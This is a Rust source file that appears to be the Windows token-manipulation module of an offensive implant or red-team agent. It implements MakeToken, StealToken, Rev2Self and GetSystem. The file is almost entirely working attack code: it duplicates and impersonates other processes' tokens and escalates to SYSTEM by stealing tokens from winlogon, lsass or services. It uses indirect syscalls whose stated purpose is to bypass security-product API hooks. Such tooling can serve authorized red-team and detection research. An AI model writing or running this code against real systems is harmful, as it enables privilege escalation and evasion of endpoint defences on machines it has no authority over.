//! Token manipulation primitives for Windows.
//!
//! Provides:
//! - **MakeToken** — create a new logon session with supplied credentials.
//! - **StealToken** — duplicate an existing process token and impersonate it.
//! - **Rev2Self** — revert to the original process token.
//! - **GetSystem** — elevate to SYSTEM by impersonating a SYSTEM process token.
//!
//! All NT operations are performed via indirect syscalls resolved through the
//! `nt_syscall` crate to avoid IAT hooks.

#![cfg(windows)]

use anyhow::{anyhow, Context, Result};
use std::sync::{Mutex, OnceLock};
use winapi::um::winnt::{
    DUPLICATE_SAME_ACCESS, HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
    TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentThread, OpenThreadToken, SetThreadToken};
use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, RevertToSelf};
use winapi::um::winnt::TOKEN_STATISTICS;
use winapi::um::winnt::TokenStatistics;

/// Stores the impersonation token so `Rev2Self` can close it.
static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);

/// Stores the original primary token captured on first impersonation.
/// Populated exactly once; subsequent `steal_token` calls must NOT
/// overwrite this — doing so would leak the handle.
static SAVED_PRIMARY_TOKEN: OnceLock<Mutex<Option<HANDLE>>> = OnceLock::new();

fn saved_primary() -> &'static Mutex<Option<HANDLE>> {
    SAVED_PRIMARY_TOKEN.get_or_init(|| Mutex::new(None))
}

// ── Logon type constants (from winnt.h) ────────────────────────────────────
const LOGON32_LOGON_INTERACTIVE: u32 = 2;
const LOGON32_LOGON_NETWORK: u32 = 3;
const LOGON32_LOGON_BATCH: u32 = 4;
const LOGON32_LOGON_SERVICE: u32 = 5;
const LOGON32_LOGON_NETWORK_CLEARTEXT: u32 = 8;
const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;

// ── NTSTATUS helpers ───────────────────────────────────────────────────────

fn nt_success(status: i32) -> bool {
    status >= 0
}

fn nt_error(status: i32) -> bool {
    status < 0
}

// ── Indirect syscall wrappers ──────────────────────────────────────────────
// These thin wrappers call through nt_syscall to resolve SSNs and gadget
// addresses at runtime, bypassing user-mode API hooks on Advapi32 / ntdll.

/// Call `NtOpenProcess` via indirect syscall to obtain a HANDLE to a process.
unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, CLIENT_ID};

    let mut handle: HANDLE = std::ptr::null_mut();
    let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
    oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

    let mut cid: CLIENT_ID = std::mem::zeroed();
    cid.UniqueProcess = pid as *mut _;

    let target = nt_syscall::get_syscall_id("NtOpenProcess")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcess SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut handle as *mut _ as u64,
            PROCESS_QUERY_LIMITED_INFORMATION as u64,
            &mut oa as *mut _ as u64,
            &mut cid as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtOpenProcess failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(handle)
    }
}

/// Call `NtOpenProcessToken` via indirect syscall.
unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> {
    let mut token: HANDLE = std::ptr::null_mut();
    let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
        .map_err(|e| anyhow!("failed to resolve NtOpenProcessToken SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            process as u64,
            access as u64,
            &mut token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(token)
    }
}

/// Close a kernel handle via `NtClose` indirect syscall (avoids IAT entry for
/// CloseHandle).  Falls back to `CloseHandle` from the IAT if the syscall
/// resolver is unavailable.  Best-effort — errors are silently ignored.
fn nt_close_handle(handle: u64) {
    if handle == 0 || handle == usize::MAX as u64 {
        return;
    }
    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
        let _ = unsafe {
            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle])
        };
    } else {
        unsafe { CloseHandle(handle as *mut _ as HANDLE) };
    }
}

/// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
/// or primary token from an existing token.
unsafe fn nt_duplicate_token(
    existing: HANDLE,
    access: u32,
    token_type: u32,
) -> Result<HANDLE> {
    use winapi::um::winnt::{SECURITY_QUALITY_OF_SERVICE};

    let mut new_token: HANDLE = std::ptr::null_mut();

    let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
    sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
    sqos.ImpersonationLevel = SecurityImpersonation as u32;
    sqos.ContextTrackingMode = 0;
    sqos.EffectiveOnly = 0;

    // NtDuplicateToken(
    //   ExistingTokenHandle, DesiredAccess, ObjectAttributes,
    //   EffectiveOnly, TokenType, NewTokenHandle
    // )
    let target = nt_syscall::get_syscall_id("NtDuplicateToken")
        .map_err(|e| anyhow!("failed to resolve NtDuplicateToken SSN: {e}"))?;
    let status = nt_syscall::do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            existing as u64,
            access as u64,
            &mut sqos as *mut _ as u64,
            0u64, // EffectiveOnly = FALSE
            token_type as u64,
            &mut new_token as *mut _ as u64,
        ],
    );

    if nt_error(status) {
        Err(anyhow!("NtDuplicateToken failed: NTSTATUS 0x{status:08X}"))
    } else {
        Ok(new_token)
    }
}

// ── Public API ─────────────────────────────────────────────────────────────

/// Create a new logon session with the provided credentials.
///
/// `logon_type` maps to the standard `LOGON32_LOGON_*` constants:
///   - 2 = Interactive
///   - 3 = Network
///   - 4 = Batch
///   - 5 = Service
///   - 8 = Network Cleartext
///   - 9 = New Credentials
///
/// On success, the new token is applied to the calling thread and the
/// original token is saved for `Rev2Self`.
pub fn make_token(
    username: &str,
    password: &str,
    domain: &str,
    logon_type: u32,
) -> Result<String> {
    use winapi::um::securitybaseapi::ImpersonateLoggedOnUser;
    use winapi::um::winbase::LogonUserA;

    let valid_logon_types = [2, 3, 4, 5, 8, 9];
    let lt = if valid_logon_types.contains(&logon_type) {
        logon_type
    } else {
        LOGON32_LOGON_INTERACTIVE
    };

    let mut token: HANDLE = std::ptr::null_mut();

    let user_wide = std::ffi::CString::new(username)
        .map_err(|e| anyhow!("invalid username: {e}"))?;
    let pass_wide = std::ffi::CString::new(password)
        .map_err(|e| anyhow!("invalid password: {e}"))?;
    let dom_wide = std::ffi::CString::new(domain)
        .map_err(|e| anyhow!("invalid domain: {e}"))?;

    let ok = unsafe {
        LogonUserA(
            user_wide.as_ptr() as *mut _,
            dom_wide.as_ptr() as *mut _,
            pass_wide.as_ptr() as *mut _,
            lt,
            TOKEN_ALL_ACCESS,
            &mut token,
        )
    };

    if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(anyhow!("LogonUser failed with Win32 error {err}"));
    }

    // Save the current thread token (if any) for Rev2Self.
    save_current_token();

    // Impersonate the new token.
    let ok = unsafe { ImpersonateLoggedOnUser(token) };
    let impersonate_result = if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        Err(anyhow!("ImpersonateLoggedOnUser failed with Win32 error {err}"))
    } else {
        Ok(())
    };

    unsafe { CloseHandle(token) };

    impersonate_result?;

    let lt_name = match lt {
        2 => "Interactive",
        3 => "Network",
        4 => "Batch",
        5 => "Service",
        8 => "NetworkCleartext",
        9 => "NewCredentials",
        _ => "Unknown",
    };

    Ok(format!(
        "MakeToken: created {} logon session for {}\\{}",
        lt_name, domain, username
    ))
}

/// Duplicate the token of a target process and begin impersonating it.
///
/// Uses indirect syscalls to open the target process and duplicate its token,
/// avoiding IAT hooks on `OpenProcessToken` / `DuplicateTokenEx`.
pub fn steal_token(target_pid: u32) -> Result<String> {
    // Open the target process via indirect syscall.
    let process = unsafe { nt_open_process(target_pid) }
        .with_context(|| format!("failed to open process PID {target_pid}"))?;

    // Open the process token via indirect syscall.
    let token = unsafe { nt_open_process_token(process, TOKEN_DUPLICATE | TOKEN_QUERY) }
        .with_context(|| format!("failed to open token for PID {target_pid}"))?;

    // ── Save the original primary token (once only) ─────────────────
    //
    // On the very first impersonation we open our own process token and
    // stash it in SAVED_PRIMARY_TOKEN so that Rev2Self can restore it.
    // Subsequent calls do NOT overwrite it — that would leak the handle.
    {
        let guard = saved_primary().lock().unwrap();
        if guard.is_none() {
            // Drop the lock before the syscall, then re-acquire to store.
            drop(guard);
            let mut primary: HANDLE = std::ptr::null_mut();
            let ok = unsafe {
                winapi::um::securitybaseapi::OpenProcessToken(
                    GetCurrentProcess(),
                    TOKEN_ALL_ACCESS,
                    &mut primary,
                )
            };
            if ok != 0 && !primary.is_null() {
                let mut guard = saved_primary().lock().unwrap();
                // Double-check: another thread may have populated it while
                // we were in the syscall.
                if guard.is_none() {
                    *guard = Some(primary);
                } else {
                    // Lost the race — close the extra handle.
                    unsafe { CloseHandle(primary) };
                }
            }
            // If OpenProcessToken fails we proceed anyway — Rev2Self will
            // fall back to RevertToSelf() which uses the process token
            // implicitly.
        }
    }

    // Duplicate into an impersonation token via indirect syscall.
    let token_type = TokenImpersonation as u32;
    let new_token = unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, token_type) }
        .context("failed to duplicate token")?;

    // Apply the impersonation token to our thread.
    let ok = unsafe { SetThreadToken(std::ptr::null_mut(), new_token) };
    if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        unsafe {
            CloseHandle(new_token);
            CloseHandle(token);
            CloseHandle(process);
        }
        return Err(anyhow!("SetThreadToken failed with Win32 error {err}"));
    }

    unsafe {
        CloseHandle(token);
        CloseHandle(process);
    }

    // Store the impersonation token so Rev2Self can close it.
    {
        let mut saved = SAVED_TOKEN.lock().unwrap();
        // Close any previously stored impersonation token (from a prior
        // steal_token call that was not reverted) to avoid leaking it.
        if let Some(old_imp) = saved.take() {
            nt_close_handle(old_imp as u64);
        }
        *saved = Some(new_token);
    }

    Ok(format!("StealToken: now impersonating token from PID {target_pid}"))
}

/// Revert to the original process token (undo `StealToken` / `MakeToken`).
///
/// Closes the impersonation token via `NtClose` (indirect syscall), then
/// restores the saved primary token via `SetThreadToken(None, primary)`,
/// and finally closes the saved primary token handle.
pub fn rev2self() -> Result<String> {
    // ── Close the impersonation token via NtClose ──────────────────────
    {
        let mut saved = SAVED_TOKEN.lock().unwrap();
        if let Some(imp_token) = saved.take() {
            nt_close_handle(imp_token as u64);
        }
    }

    // ── Restore the saved primary token ────────────────────────────────
    //
    // If we have a saved primary token, apply it to the thread directly.
    // This is more reliable than RevertToSelf when the impersonation was
    // set via SetThreadToken.  Fall back to RevertToSelf otherwise.
    let primary_opt = {
        let mut guard = saved_primary().lock().unwrap();
        guard.take()
    }; // guard dropped here — lock released before syscall.
    unsafe {
        if let Some(primary) = primary_opt {
            SetThreadToken(std::ptr::null_mut(), primary);
            // Close the saved primary token handle now that we've restored.
            nt_close_handle(primary as u64);
        } else {
            RevertToSelf();
        }
    }

    Ok("Rev2Self: reverted to original process token".to_string())
}

/// Elevate to SYSTEM by finding a SYSTEM-owned process and stealing its token.
///
/// Strategy: enumerate running processes via `NtQuerySystemInformation`,
/// find one running as NT AUTHORITY\SYSTEM (e.g. winlogon.exe, lsass.exe,
    /// services.exe), and impersonate its token.
pub fn get_system() -> Result<String> {
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::psapi::EnumProcesses;

    // Enumerate all PIDs.
    let mut pids = [0u32; 4096];
    let mut bytes_returned = 0u32;
    let ok = unsafe {
        EnumProcesses(pids.as_mut_ptr(), std::mem::size_of_val(&pids) as u32, &mut bytes_returned)
    };
    if ok == 0 {
        return Err(anyhow!("EnumProcesses failed"));
    }

    let pid_count = bytes_returned as usize / std::mem::size_of::<u32>();

    // Target process names that run as SYSTEM.
    let system_procs = [
        b"winlogon.exe\0",
        b"lsass.exe\0",
        b"services.exe\0",
    ];

    for &pid in &pids[..pid_count] {
        if pid == 0 || pid == unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() } {
            continue;
        }

        // Try to open and query the process name.
        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };
        if handle.is_null() {
            continue;
        }

        let mut name_buf = [0u16; 260];
        let mut name_len = name_buf.len() as u32;
        unsafe {
            winapi::um::processthreadsapi::QueryFullProcessImageNameW(
                handle,
                0,
                name_buf.as_mut_ptr(),
                &mut name_len,
            );
        }
        unsafe { CloseHandle(handle) };

        // Extract the filename part.
        let name_str = String::from_utf16_lossy(&name_buf[..name_len as usize]);
        let filename = name_str.rsplit('\\').next().unwrap_or(&name_str).to_lowercase();

        let matches = system_procs.iter().any(|sp| {
            let sp_str = String::from_utf16_lossy(
                &sp.iter().take_while(|&&b| b != 0).map(|&b| b as u16).collect::<Vec<_>>(),
            );
            filename == sp_str.to_lowercase()
        });

        if matches {
            return steal_token(pid);
        }
    }

    Err(anyhow!("GetSystem: no suitable SYSTEM process found"))
}

// ── Helpers ────────────────────────────────────────────────────────────────

/// Return the current impersonation token handle if one is active.
///
/// Used by `interactive_shell` to create child processes with the correct
/// security context (e.g. `CreateProcessWithTokenW`).  Returns a null
/// `HANDLE` when no impersonation token is set.
pub fn get_current_token() -> HANDLE {
    let saved = SAVED_TOKEN.lock().unwrap();
    saved.unwrap_or(std::ptr::null_mut())
}

/// Save the current thread's impersonation token (if any) for later restoration.
fn save_current_token() {
    let mut token: HANDLE = std::ptr::null_mut();
    let ok = unsafe {
        OpenThreadToken(
            GetCurrentThread(),
            TOKEN_ALL_ACCESS,
            1, // OpenAsSelf = TRUE
            &mut token,
        )
    };

    let mut saved = SAVED_TOKEN.lock().unwrap();
    if ok != 0 && !token.is_null() {
        // There was a thread token — save it.
        // Close any previously saved token first.
        if let Some(old) = saved.take() {
            unsafe { CloseHandle(old) };
        }
        *saved = Some(token);
    }
    // If no thread token (ok == 0 with ERROR_NO_TOKEN), that's fine —
    // Rev2Self will call RevertToSelf() which restores the process token.
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn logon_type_constants_are_standard() {
        assert_eq!(LOGON32_LOGON_INTERACTIVE, 2);
        assert_eq!(LOGON32_LOGON_NETWORK, 3);
        assert_eq!(LOGON32_LOGON_BATCH, 4);
        assert_eq!(LOGON32_LOGON_SERVICE, 5);
        assert_eq!(LOGON32_LOGON_NETWORK_CLEARTEXT, 8);
        assert_eq!(LOGON32_LOGON_NEW_CREDENTIALS, 9);
    }
}
